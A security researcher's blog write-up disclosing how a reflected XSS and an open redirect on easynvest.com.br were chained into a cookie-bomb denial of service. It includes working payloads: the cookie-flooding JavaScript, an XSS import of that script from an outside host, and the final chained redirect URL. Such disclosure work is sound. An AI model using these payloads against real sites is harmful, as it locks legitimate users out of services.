---
layout: content
title: 'Chaining client-side vulnerabilities to make a web app unavailable'
description: 'Two client-side vulnerabilities that, if exploited by an attacker, could expose the legitimate users of the application to various risks, one of which is a kind of "unavailability"'
og_image: https://heitorgouvea.me/images/publications/nuinvest/xss-triaged.png
---

Table of contents:
- [Summary](#summary)
- [Description](#description)
- [Prooft of Concept](#proof-of-concept)
- [Impact](#impact)
- [Conclusion](#conclusion)
- [References](#references)

---

### Summary

During a security analysis of the web application operated by easynvest.com.br (acquired by Nubank), two client-side vulnerabilities were identified. When combined, these flaws can be exploited to compromise the service’s availability for legitimate users. Specifically, the attack chain enables a Denial of Service (DoS) condition through client-side exploitation.

**Timeline**

```
23/05/2020: PoC performed  
24/05/2020: Vulnerability reported  
27/05/2020: Vulnerability confirmed  
13/07/2020: Vulnerability "fix"  
21/12/2022: Publication of this article
```

*Disclaimer:* The responsible company was informed of all details contained in this publication as promptly as possible. It responded ethically and transparently, demonstrating due diligence and commitment. No systems were accessed or breached during testing, and the company implemented some necessary actions to minimise potential abuse of the context described herein.

---

### Description

The application includes a feature that generates personalised referral links using URL parameters, as shown in the example below:

![Image](/images/publications/nuinvest/link-indique.png)

- [https://indique.easynvest.com.br?nome=heitor%20REDACTED\&id=\[NUMERICAL ID REDACTED\]]()

![Image](/images/publications/nuinvest/site.png)

When the link is accessed, the `?nome=` parameter is directly reflected on the user’s screen. This behaviour indicates a reflected Cross-Site Scripting (XSS) vulnerability (\[1], \[2]), which was confirmed using the following payload:

- [https://indique.easynvest.com.br/?nome=\<audio src/onerror=alert(1)>\&id=1]()

![Image](/images/publications/nuinvest/xss-triaged.png)

Although exploitable, the vulnerability’s impact is limited by several factors:

* The vulnerable component is hosted on a subdomain, restricting access to `LocalStorage` on the main domain;
* Sensitive cookies are protected with the `HttpOnly` flag;
* Being a reflected XSS, it requires user interaction and is not easily propagated;
* The main domain enforces strong security policies, including anti-CSRF tokens and headers such as `X-Frame-Options` (XFO), Content Security Policy (CSP), and CORS.

Given these constraints, the analysis turned to identifying a complementary vulnerability to chain with the reflected XSS. The JavaScript on the authentication page revealed an Open Redirect vulnerability (\[3], \[4]):

- [https://www.easynvest.com.br/autenticacao?redirect\_url=https://google.com]()

**Demo:**

<iframe width="100%" height="523" src="https://www.youtube.com/embed/sN1J3py9aUo" title="Open Redirect - Easynvest.com.br" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

This unvalidated redirect on the main domain allows malicious payloads to be delivered more reliably, partially bypassing the limitations imposed by the subdomain-restricted XSS. However, further exploitation attempts targeting account takeover, data exfiltration, or critical actions were unsuccessful, as the application requires Multi-Factor Authentication (MFA) for sensitive operations (\[7]).

As an alternative, the two vulnerabilities were combined to perform a **Cookie Bomb** attack with the aim of making the application unavailable to users who visit a crafted malicious link. The attack involves injecting an excessive number of oversized cookies, exceeding the server’s processing limits. As a result, subsequent requests from the affected browser are rejected, causing the application to fail to load—effectively creating a user-specific DoS condition. While modern browsers typically allow numerous cookies (each up to \~4KB), most servers are not designed to handle abnormally large volumes of cookie data, leading to inaccessibility until the user manually clears the cookies or they expire.

For further reading, refer to:

* *Cookie Bomb or Let’s Break the Internet* \[9] by Egor Homakov
* *Denial of Service with Cookie Bomb* \[10] by filedescriptor

---

### Proof of Concept

The exploitation chain proceeds as follows:

1. **Host a JavaScript payload** to generate oversized cookies:

```javascript
var base_domain = document.domain.substr(document.domain.indexOf('.'));
var pollution   = Array(4000).join('a');

for (var i = 1; i < 99; i++) {
    document.cookie='bomb' + i + '=' + pollution + ';Domain=' + base_domain + ";path=/";
}

window.location="https://" + document.domain;
```

- Hosted at: [https://heitorgouvea.me/public/payloads/bomb.js](https://heitorgouvea.me/public/payloads/bomb.js)

2. **Trigger the script via reflected XSS:**
   
- [https://indique.easynvest.com.br/?nome=>\<audio src="" onerror=import('//heitorgouvea.me/public/payloads/bomb.js');>\&id=1]()

3. **Use an Open Redirect (with a shortened URL) to obscure the payload:**
   
- [https://cutt.ly/syPnJXp]()

**Final chained payload:**

- [https://easynvest.com.br/autenticacao?redirect\_url=https://cutt.ly/syPnJXp]()

**Result:**

<iframe width="100%" height="523" src="https://www.youtube.com/embed/-L2pl1Ke_Lo" title="Cookie Bomb - easynvest.com.br" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

---

### Impact

This attack chain allows an adversary to cause localised unavailability of the application for individual users. By exceeding the server’s cookie-processing capabilities, the application becomes unresponsive for the affected user until they manually clear the injected cookies. While this analysis focused on a DoS vector, further attack paths may arise depending on future application updates or misconfigurations.

---

### Conclusion

The exploitation described requires relatively little technical sophistication but can significantly impact user experience. By chaining a reflected XSS with an Open Redirect, it is possible to execute a Cookie Bomb attack that results in targeted denial of service. Though rarely exploited in practice, this vector is effective under suitable conditions.

Following responsible disclosure, the company took the following actions:

- No definitive fix was applied to the Open Redirect vulnerability;
- The XSS vulnerability was partially mitigated via Web Application Firewall (WAF) rules, though multiple bypasses were identified. Technical feedback was shared, but no further updates were received.

---

### References

* \[1] [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)
* \[2] [https://owasp.org/www-community/attacks/xss/](https://owasp.org/www-community/attacks/xss/)
* \[3] [https://portswigger.net/kb/issues/00500100\_open-redirection-reflected](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
* \[4] [https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated\_Redirects\_and\_Forwards\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
* \[5] [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)
* \[6] [https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site\_Request\_Forgery\_Prevention\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
* \[7] [https://cheatsheetseries.owasp.org/cheatsheets/Multifactor\_Authentication\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html)
* \[8] [https://en.wikipedia.org/wiki/HTTP\_cookie](https://en.wikipedia.org/wiki/HTTP_cookie)
* \[9] [https://blog.innerht.ml/tag/cookie-bomb/](https://blog.innerht.ml/tag/cookie-bomb/)
* \[10] [https://homakov.blogspot.com/2014/01/cookie-bomb-or-lets-break-internet.html](https://homakov.blogspot.com/2014/01/cookie-bomb-or-lets-break-internet.html)
